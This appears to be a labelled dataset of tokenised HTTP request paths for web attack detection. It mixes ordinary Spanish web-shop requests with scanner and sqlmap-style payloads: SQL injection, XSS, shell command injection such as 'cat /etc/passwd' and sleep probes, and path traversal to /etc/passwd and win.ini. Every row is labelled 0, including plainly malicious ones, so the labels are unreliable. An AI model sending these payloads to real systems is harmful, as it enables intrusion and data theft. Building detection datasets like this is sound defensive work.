sentences 	 labels
/ string / strings / parameters = 1 '  )  or exp (  ~  ( select  *  from  ( select concat ( 0x7171706a71 ,  ( select  ( elt ( 6270 = 6270 , 1 )  )  )  , 0x717a767a71 , 0x78 )  ) x )  )  and  (  ' nopu '  =  ' nopu  \r\n\r\n 	 0
/ string / modo = registro & login = winny & password = centillero & nombre = zoa & apellidos = antonioli + blanc & email = gonard . guercio @ cincocolores . va & dni = 25815583s & direccion = fincas + adjuntas + 15 +  & ciudad = canal + de + berdn & cp = 4913a & provincia = la + rioja & ntc = 6959722794885758 & b1 = registrar  \r\n\r\n 	 0
/ string / strings / parameters = < div style =  " width :  expression ( confirm ( 5 )  )  ;  "  >  \r\n\r\n 	 0
/ string / strings / parameters = '  . print (  ` echo pfjgqm echo  $  (  ( 86 + 33 )  )  echo pfjgqm echo pfjgqm `  )  ;  )  } pfjgqm  \r\n\r\n 	 0
/ string / strings / parameters = &  & echo $ ifsrirrvg $  (  ( 43 + 47 )  )  $  ( echo $ ifsrirrvg ) rirrvg  \r\n\r\n 	 0
/ top . php ? stuff =  " ping \ xa0-w \ xa09000 \ xa0-n \ xa01 \ xa04 . 3 . 2 . 1 | rem \ xa0  \r\n\r\n 	 0
/ j734qobz . exe ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  \r\n\r\n 	 0
/ string / modo = insertar |  & precio = 7602 & b1 = confirmar  \r\n\r\n 	 0
/ string / strings / parameters = )  ;  } print (  ` echo oskstf echo  $  (  ( 2 + 12 )  )  echo oskstf echo oskstf `  )  ;  .  ' oskstf  \r\n\r\n 	 0
/ top . php ? stuff =  "  \ x0auname  > q15138829  #  \r\n\r\n 	 0
/ string / strings / parameters = ;  str =  $  ( echo ytwfpg )  ;  str1 =  $  {  # str }  ;  if  [  8 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  /  /  \r\n\r\n 	 0
/ ywaxntrx . fts ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  \r\n\r\n 	 0
/ o1zj4u9v . php ?  < meta http-equiv = set-cookie content =  " testabrn = 6368 "  >  \r\n\r\n 	 0
/  .  .  % u2216 .  .  % u2216 .  .  % u2216 .  .  % u2216 .  .  % u2216 .  .  % u2216 .  .  % u2216 .  .  % u2216 { file }  \r\n\r\n 	 0
/ string / strings / parameters = < img + lowsrc =  " javascript : alert ( 1 )  ;  "  >  \r\n\r\n 	 0
/ string / strings / parameters = '  ; echo drgcti $  (  ( 40 + 71 )  )  $  ( echo drgcti ) drgcti /  /  \r\n\r\n 	 0
/ examples / jsp / sessions / athenareg . php ? pass =   ; id  \r\n\r\n 	 0
/ string / id = 3 /  & nombre = queso + manchego & precio = 39 & cantidad = 45 & b1 = aadir + al + carrito  \r\n\r\n 	 0
/ scripts / webmail . exe  \r\n\r\n 	 0
/ manager / session / login . php ? dest = nessus "  >  < script > alert (  ' ossim_dest_xss . nasl '  )  <  / script >  <  !  --  \r\n\r\n 	 0
/ removal_tool . exe /  \r\n\r\n 	 0
/ string / strings / parameters = &  sleep 0  &  &  str =  $  ( echo pdoptj )   &  &  str1 =  $  {  # str }   &  &   [  2 -eq  $  { str1 }   ]   &  &  sleep 1  /  /  \r\n\r\n 	 0
/ igtf0zon . exe ?  < script > cross_site_scripting . nasl <  / script >  \r\n\r\n 	 0
/ nsn /  .  .  \ util / copy . bas  \r\n\r\n 	 0
/ examples / jsp / cal / directorypro . cgi ? want = showcat & show =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00  \r\n\r\n 	 0
/ string / strings / parameters = -9484 '  or  ( 7129 = 2349 )  * 2349 and  ' fcsa '  like  ' fcsa  \r\n\r\n 	 0
/ examples / jsp / num / index . php ? _language =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00  \r\n\r\n 	 0
/ string / strings / parameters = | echo phlzmc $  (  ( 98 + 93 )  )  $  ( echo phlzmc ) phlzmc \  \r\n\r\n 	 0
/ help . php ? q =  " rm \ xa0q88986355 & rem \ xa0  \r\n\r\n 	 0
/ admin / components / com_fm / fm . install . php ? lm_absolute_path =  .  .  /  .  .  /  .  .  /  & install_dir = limbo_com_fm_php_shell . nasl-1331904435  \r\n\r\n 	 0
/ string / strings / parameters = |   [  1 -ne  $  ( echo ftwokg  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  |  \r\n\r\n 	 0
/ cgi-bin / search . jsp ? q =  %  "  < script > alert ( 1332008604 )  <  / script >  \r\n\r\n 	 0
/ phpmyadmin /  ?  "  >  < script > alert (  ' struts_sa_surl_xss . nasl '  )  <  / script >  \r\n\r\n 	 0
/ string / strings / parameters = 1 where 8905 = 8905 and make_set ( 7654 = 1923 , 1923 )  --  \r\n\r\n 	 0
/ string / strings / parameters = 1 %  "  "  )  union all select null , null , null , null , null , null , null , null , null --  \r\n\r\n 	 0
/ uvazfs7p . x ?  < script > document . cookie =  " testwtbo = 4831 ;  "  <  / script >  \r\n\r\n 	 0
/ 6qbynt4f . cgi ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  \r\n\r\n 	 0
/ string / strings / parameters = echo urbcmk $  (  ( 17 + 54 )  )  $  ( echo urbcmk ) urbcmk '  \r\n\r\n 	 0
/ scripts / index . php ? act = sm_window & page = event & day = -1 union select 1 , 1331905207 , 2042987140  --  \r\n\r\n 	 0
/ r3le3om5 . pl ?  < script > cross_site_scripting . nasl <  / script >  \r\n\r\n 	 0
/ scripts / callboth . php ? seq = 654321 & out = 123456 & in = 1331908862 @ nessus \ x0d \ x0aasteridex_in_code_injection . nasl  \r\n\r\n 	 0
/ examples / jsp / cal / perl . exe ? -v  \r\n\r\n 	 0
/ string / strings / parameters = '  &  sleep 0  &  &  str =  $  ( echo bodwqd )   &  &  str1 =  $  {  # str }   &  &   [  8 -eq  $  { str1 }   ]   &  &  sleep 1  /  /  \r\n\r\n 	 0
/ string / modo = registro & login = liping & password = paletada & nombre = laura & apellidos = esparraguera & email = palk @ interpretacion-diccionario-y-significado-de-los-sueos . com .  & dni = b93390897h & direccion = calle + gonzalo + de + berceo + 76 ,  +  & ciudad = rioseco + de + soria & cp = 16890 & provincia = salamanca & ntc = 5041701632668504 & b1 = registrar  \r\n\r\n 	 0
/ dda2qr7j . dll ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  \r\n\r\n 	 0
/ string / strings / parameters = 10 + union + select + load_file ( 0x2f6574632f706173737764 )  \r\n\r\n 	 0
/ string / strings / parameters = 1 )  where 2678 = 2678 union all select null , null , null , null , null , null , null , null , null #  \r\n\r\n 	 0
/ bzuf9ozq . idc ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  \r\n\r\n 	 0
/ string / strings / parameters = &  & echo zepmbc $  (  ( 82 + 3 )  )  $  ( echo zepmbc ) zepmbc &  \r\n\r\n 	 0
/ examples / jsp / checkbox / gotopage . cgi ? 4242 +  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd  \r\n\r\n 	 0
/ string / strings / parameters = -2168 "  "  )  )  union all select 4935 , 4935 , 4935 , 4935 , 4935 , 4935 , 4935 , 4935 , 4935 --  \r\n\r\n 	 0
/ string / strings / parameters = 1 '  +  ( select  ' xqjx '  where 7048 = 7048 and 9198 = 9198 --  \r\n\r\n 	 0
/ string / modo = registro & login = anurag & password = am60a4i7o & nombre = custodio & apellidos = amazarray + gersol & email = martell @ 923 . pe & dni = 15138092k & direccion = sant + josep ,  + 93 ,  +  & ciudad = castellar + del + valls & cp = 03813 & provincia = soria "  >  <  !  --  # exec + cmd =  " dir +  "  --  >  <  & ntc = 2906865498291139 & b1 = registrar  \r\n\r\n 	 0
/ string / strings / parameters = 1 '  where 2183 = 2183 ; select  ( case when  ( 3855 = 3855 )  then 3855 else 1 /  ( select 0 )  end )  --  \r\n\r\n 	 0
/ string / modo = registro & login = paros "  style =  " background : url ( javascript : alert (  ' paros '  )  )  & password = alarm ? ista & nombre = zelina & apellidos = morcillo + amparan & email = colona @ aebo . lb & dni = 86164975y & direccion = alamo ,  + s / n ,  +  & ciudad = casas + de + reina & cp = 05413 & provincia = salamanca & ntc = 0630515936517830 & b1 = registrar  \r\n\r\n 	 0
/ string / strings / parameters = 1 %  '  )  union all select null , null , null , null , null , null , null #  \r\n\r\n 	 0
/ 9kr0ih0v . do ?  < meta http-equiv = set-cookie content =  " testzgnm = 1183 "  >  \r\n\r\n 	 0
/ string / strings / parameters = 1 )  where 7199 = 7199 and 8407 =  ( select count (  *  )  from generate_series ( 1 , 5000000 )  )  --  \r\n\r\n 	 0
/ string / strings / parameters = '  | echo $ ifsfrpqgh $  (  ( 5 + 72 )  )  $  ( echo $ ifsfrpqgh ) frpqgh  \r\n\r\n 	 0
/ string / strings / parameters = "  + if ( benchmark ( 3000000 , md5 ( 1 )  )  , null , null )  , null , null , null , null , null , null , null , null )   --  \r\n\r\n 	 0
/ string / strings / parameters = 1 "  "  )  ; call regexp_substring ( repeat ( right ( char ( 2385 )  , 0 )  , 500000000 )  , null )  --  \r\n\r\n 	 0
/ string / strings / parameters = |   [  6 -ne  $  ( echo dlkwgt  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  "  \r\n\r\n 	 0
/ main . php ? logout =  & ver \ x0b > q39725894 & rem \ x0b  \r\n\r\n 	 0
/ string / strings / parameters = < form >  < button formaction =  " javascript : alert ( 1 )  "  > x <  / button >  \r\n\r\n 	 0
/ uc3w3bdi . kspx ?  < script > document . cookie =  " testxllt = 9940 ;  "  <  / script >  \r\n\r\n 	 0
/ string / modo = registro & login = polk & password = d8fide10i3 & nombre = norcelo & apellidos = payseo + el_gueta & email = cummings @ muebetuweb . lr & dni = 85128607h & direccion = calle + floridablanca ,  + 114 ,  + 7b & ciudad = linares + de + riofro & cp = 07127 & provincia = zaragoza & ntc = 3967507613982177 & b1 = registrar  \r\n\r\n 	 0
/ string / strings / parameters = '  ;  str =  $  ( echo hldnyh )  ;  str1 =  $  {  # str }  ;  if  [  5 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  &  \r\n\r\n 	 0
/ top . php ? stuff =  '  ; uname \ x09 > q48683432 \ x09 #  \r\n\r\n 	 0
/ phpmyadmin / secure . php ? cfgprogdir =  / etc / passwd \ x00  \r\n\r\n 	 0
/ main . php ? logout =  " ver \ xa0 > q51679818 & rem \ xa0  \r\n\r\n 	 0
/ string / str =  $  ( echo jadkkf )   str1 =  $  {  # str }   if  [  1 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  "  \r\n\r\n 	 0
/ string / strings / parameters = \ x3cscript > javascript : alert ( 1 )  <  / script >  \r\n\r\n 	 0
/ string / modo = registro & login = bustillo & password = des6ra50ce3 & nombre = juana + del + pilar & apellidos = soria + lloren & email = tushingham @ saavedradiaz . hu & dni = 05392148m & direccion = carrer + auro + s / n ,  + 1 ? h & ciudad = zugarramurdi & cp = 10130 & provincia = lleida & ntc = 250050684012121 & b1 = registrar  \r\n\r\n 	 0
/ string / strings / parameters = 1 '  )  rlike  ( select  ( case when  ( 7447 = 3981 )  then 1 else 0x28 end )  )  \r\n\r\n 	 0
/ string / strings / parameters = 1 )  )  as ewlg where 3722 = 3722 rlike sleep ( 5 )  --  \r\n\r\n 	 0
/ l752x1ry . cfm ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  \r\n\r\n 	 0
/ examples / servlets / servlet / directory . php ? dir =  ; cat  / etc / passwd  \r\n\r\n 	 0
/ string / strings / parameters = &  & echo $ ifsdkxdpb $  (  ( 45 + 44 )  )  $  ( echo $ ifsdkxdpb ) dkxdpb \  \r\n\r\n 	 0
/ string / strings / parameters = 1 '  )  procedure analyse ( extractvalue ( 9255 , concat ( 0x5c ,  ( benchmark ( 5000000 , md5 ( 0x52515a50 )  )  )  )  )  , 1 )  and  (  ' szib '  like  ' szib  \r\n\r\n 	 0
/ string / strings / parameters = < svg onload = document . writeln ( decodeuri ( location . hash )  )  >  #  < img src = onerror = alert ( 1 )  >  \r\n\r\n 	 0
/ string / modo = entrar & login = rizzardi & pwd =  , 9 / oc7c4 , 0 & remember = on & b1 = entrar  \r\n\r\n 	 0
/ phpmyadmin / documentation . html ? phpmyadmin =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00index . html  \r\n\r\n 	 0
/ manager / mrtg . cgi ? cfg =  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / winnt / win . ini  \r\n\r\n 	 0
/ query . idq ? citemplate =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / winnt / win . ini  \r\n\r\n 	 0
/ help . php ? q =  ' sleep 11  #  \r\n\r\n 	 0
/ string / strings / parameters = 1 )  )  ; select  *  from generate_series ( 4592 , 4592 , case when  ( 4592 = 4592 )  then 1 else 0 end )  limit 1 --  \r\n\r\n 	 0
/ string / strings / parameters = echo $ ifsuhekzf $  (  ( 6 + 76 )  )  $  ( echo $ ifsuhekzf ) uhekzf &  \r\n\r\n 	 0
/ cgi-bin / dataservice . asmx / authuser ? username =  ' nessus1331919210 & password = nasl & needcompress = 0  \r\n\r\n 	 0
/ moodle / filter / tex / texed . php ? formdata = foo & pathname = foo "  +  |  |  + del + esbq  \r\n\r\n 	 0
/ j2kdmfw4 . html ?  < script > cross_site_scripting . nasl <  / script >  \r\n\r\n 	 0
/ string / strings / parameters = &  sleep 0  &  &  str =  $  ( echo qusuij )   &  &  str1 =  $  {  # str }   &  &   [  8 -eq  $  { str1 }   ]   &  &  sleep 1  \r\n\r\n 	 0
/  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  *  \r\n\r\n 	 0
/ examples / jsp / checkbox / item . fts ? href =  "  >  < script > alert (  " ftgate_44002 . nasl "  )  <  / script >  ;  \r\n\r\n 	 0
/ string / strings / parameters = echo xrkwtl $  (  ( 1 + 66 )  )  $  ( echo xrkwtl ) xrkwtl /  /  \r\n\r\n 	 0
/ string / strings / parameters = 1 '  and 8407 =  ( select count (  *  )  from generate_series ( 1 , 5000000 )  )  and  ' zetf '  =  ' zetf  \r\n\r\n 	 0
/ javascript / tickets . exe  \r\n\r\n 	 0
/ string / strings / parameters = -5026 '  or  ( 8459 = 8459 )  * 4906 and  ' uavj '  like  ' uavj  \r\n\r\n 	 0
/ string / strings / parameters = -2679 '  )  )  )  or 4747 = dbms_utility . sqlid_to_sqlhash (  ( chr ( 113 )  |  | chr ( 113 )  |  | chr ( 112 )  |  | chr ( 106 )  |  | chr ( 113 )  |  |  ( select  ( case when  ( 4747 = 4747 )  then 1 else 0 end )  from dual )  |  | chr ( 113 )  |  | chr ( 122 )  |  | chr ( 118 )  |  | chr ( 122 )  |  | chr ( 113 )  )  )  and  (  (  (  ' cutk '  like  ' cutk  \r\n\r\n 	 0
/ string / strings / parameters = )  )  waitfor delay  ' 0 : 0 : 20 '   --  \r\n\r\n 	 0
/ string / strings / parameters = 1 %  '  )  )  )  and 2388 = benchmark ( 5000000 , md5 ( 0x6d457153 )  )  #  \r\n\r\n 	 0
/ string / strings / parameters = ;  str =  $  ( echo ytwfpg )  ;  str1 =  $  {  # str }  ;  if  [  9 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  /  /  \r\n\r\n 	 0
/ string / id = 1 & nombre = queso + manchego & precio = 39 /  & cantidad = 71 & b1 = aadir + al + carrito  \r\n\r\n 	 0
/ string / strings / parameters = .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / conf / server . xml  \r\n\r\n 	 0
/ h4bi26jd . cfm ?  < script > document . cookie =  " testhrzx = 1150 ;  "  <  / script >  \r\n\r\n 	 0
/ examples / jsp / sessions / workarea / contentdesigner / ekformsiframe . aspx ? id =  "  >  < script > alert (  ' nessus '  )  <  / script >  \r\n\r\n 	 0
/ string / strings / parameters = |   [  7 -ne  $  ( echo zdevvw  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  '  \r\n\r\n 	 0
/ i don ' t feel like dancing /  \r\n\r\n 	 0
/ examples / jsp / colors / search . cgi ?  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \ winnt \ win . ini  \r\n\r\n 	 0
/ string / modo = insertar & precio = 405 & b1 = confirmar /  \r\n\r\n 	 0
/ string / strings / parameters = < iframe src =  "  "  /  / srcdoc =  '  & lt ; svg onload & equals ; alert & lpar ; 1 & rpar ;  & gt ;  '  >  \r\n\r\n 	 0
/ top . php ? stuff =  "  | ping \ xa0-w \ xa011000 \ xa0-n \ xa01 \ xa01 . 2 . 3 . 4 | rem \ xa0  \r\n\r\n 	 0
/ string / strings / parameters = "  |   [  3 -ne  $  ( echo bwwrbc  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  \  \  \r\n\r\n 	 0
/ string / strings / parameters = 1 '  or 4411 =  ( select count (  *  )  from sysusers as sys1 , sysusers as sys2 , sysusers as sys3 , sysusers as sys4 , sysusers as sys5 , sysusers as sys6 , sysusers as sys7 )  and  ' ebuo '  =  ' ebuo  \r\n\r\n 	 0
/ string / strings / parameters = "  ; echo irkbup $  (  ( 99 + 87 )  )  $  ( echo irkbup ) irkbup \  \r\n\r\n 	 0
/ string / strings / parameters = ;  str =  $  ( echo nmeesi )  ;  str1 =  $  {  # str }  ;  if  [  1 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  "  \r\n\r\n 	 0
/ javascript / right . exe  \r\n\r\n 	 0
/ en-us / n9xlumt5 . nsf ?  < script > cross_site_scripting . nasl <  / script >  \r\n\r\n 	 0
/ top . php ? stuff =  "  & rm \ x09q45798999 & rem \ x09  \r\n\r\n 	 0
/ string / strings / parameters = $  { exec ( print (  ` echo hfmdnb echo  $  (  ( 56 + 41 )  )  echo hfmdnb echo hfmdnb `  )  ;  .  " hfmdnb  \r\n\r\n 	 0
/ cgi-bin / ikonboard . cgi ? act = st & f = 1 & t = 1 & hl = nessus & st =  '  \r\n\r\n 	 0
/ 5qnlm5z2 . php ?  < script > document . cookie =  " testsixi = 8451 ;  "  <  / script >  \r\n\r\n 	 0
/ string / strings / parameters = 1 )  )  union all select null --  \r\n\r\n 	 0
/ en-us / account / search . php ? submit = true & search =  '  )  ;  \r\n\r\n 	 0
/ main . php ? stuff =  \ x0auname \ x09 > q82381573 \ x09 #  \r\n\r\n 	 0
/ string / strings / parameters = < u oncopy = alert (  )  >  copy me <  / u >  \r\n\r\n 	 0
/ string / modo = insertar & precio = 810 & b1 = confirmar /  \r\n\r\n 	 0
/ string / strings / parameters = -7795 "  "  )  where 1712 = 1712 union all select 1712 , 1712 , 1712 , 1712 #  \r\n\r\n 	 0
/ string / strings / parameters = 1 "  "  and updatexml ( 3393 , concat ( 0x2e , 0x7171706a71 ,  ( select  ( elt ( 3393 = 3393 , 1 )  )  )  , 0x717a767a71 )  , 1161 )  and  "  " ygzq "  "  like  "  " ygzq  \r\n\r\n 	 0
/ string / strings / parameters = ;  str =  $  ( echo otxvur )  ;  str1 =  $  {  # str }  ;  if  [  8 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  /  /  \r\n\r\n 	 0
/ string / modo = registro & login = karly & password = gira0dil26 & nombre = nadim & apellidos = collantes + cartaya & email = westmore-dutt @ transportesvegasl . ba & dni = 31767959z & direccion = calle + fuero + s + 1 * 56 ,  +  & ciudad = valdunquillo & cp = 16660 & provincia = mlaga & ntc = 1873694228595565 & b1 = registrar  \r\n\r\n 	 0
/ cacti / htsearch ? exclude =  `  / etc / passwd `  \r\n\r\n 	 0
/ main . php ? stuff =  '  & uname \ x09 #  \r\n\r\n 	 0
/ javascript / traceroute . exe  \r\n\r\n 	 0
/ phpreactor / inc / updatecms . inc . php ? pathtohomedir = xxpathxx ?  \r\n\r\n 	 0
/ string / strings / parameters = 1 "  "  )  and 8635 =  ( select count (  *  )  from generate_series ( 1 , 5000000 )  )  --  \r\n\r\n 	 0
/ string / strings / parameters = 1 %  "  "  )  )  and 4595 = 4595 #  \r\n\r\n 	 0
/ string / strings / parameters = 1 ,  ( select  ( case when  ( 2970 = 5830 )  then 1 else 2970 *  ( select 2970 from mysql . db )  end )  )  \r\n\r\n 	 0
/ string / modo = entrar & login = celso & pwd = desvarar & remember = on & b1 = entrar "  + and +  " 1 "  =  " 1  \r\n\r\n 	 0
/ main . php ? stuff =  "  | ping \ xa0-w \ xa011000 \ xa0-n \ xa01 \ xa01 . 2 . 3 . 4 | rem \ xa0  \r\n\r\n 	 0
/ string / strings / parameters = &  sleep 0  &  &  str =  $  ( echo bkxiyp )   &  &  str1 =  $  {  # str }   &  &   [  6 -eq  $  { str1 }   ]   &  &  sleep 1  #  \r\n\r\n 	 0
/ scripts / cal_week . php ? op = week & catview = 999 '  \r\n\r\n 	 0
/ cgi-bin / generate . cgi ? content =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00board = board_1  \r\n\r\n 	 0
/ j4drbkil . exe ?  < script > cross_site_scripting . nasl <  / script >  \r\n\r\n 	 0
/ string / strings / parameters = | echo orhnzl $  (  ( 45 + 63 )  )  $  ( echo orhnzl ) orhnzl "  \r\n\r\n 	 0
/ wapchat / src / eng . roomdeleteconfirm . php ? sysfiledir = xxpathxx  \r\n\r\n 	 0
/ string / strings / parameters = &  sleep 0  &  &  str =  $  ( echo ehnnqt )   &  &  str1 =  $  {  # str }   &  &   [  2 -eq  $  { str1 }   ]   &  &  sleep 1  \r\n\r\n 	 0
/ javascript / wysiwyg . exe  \r\n\r\n 	 0
/ 58 $  $ hoteldescription /  \r\n\r\n 	 0
/ cacti / file . cgi ? name =  / eventcache /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / boot . ini  \r\n\r\n 	 0
/ string / strings / parameters = 1 < vmlframe xmlns = urn : schemas-microsoft-com : vml style = behavior : url (  # default # vml )  ; position : absolute ; width : 100 %  ; height : 100 %  src = test . vml # xss >  <  / vmlframe >  \r\n\r\n 	 0
/ string / strings / parameters = '  echo szqvut $  (  ( 92 + 45 )  )  $  ( echo szqvut ) szqvut "  \r\n\r\n 	 0
/ string / strings / parameters = ;  str =  $  ( echo tsxscx )  ;  str1 =  $  {  # str }  ;  if  [  4 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  \  \  \r\n\r\n 	 0
/ scripts / modules . php ? mod = fm & file =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00 & bn = fm_d1  \r\n\r\n 	 0
/ string / strings / parameters = "  "  ; alert (  ' xss )  /  /  \r\n\r\n 	 0
/ index . php ? module = topics & func = view & topicid = -1 union select null , null ,  ' mdpro_topicid_sql_injection . nasl-1332010395 '  , null , null , null , null  --  \r\n\r\n 	 0
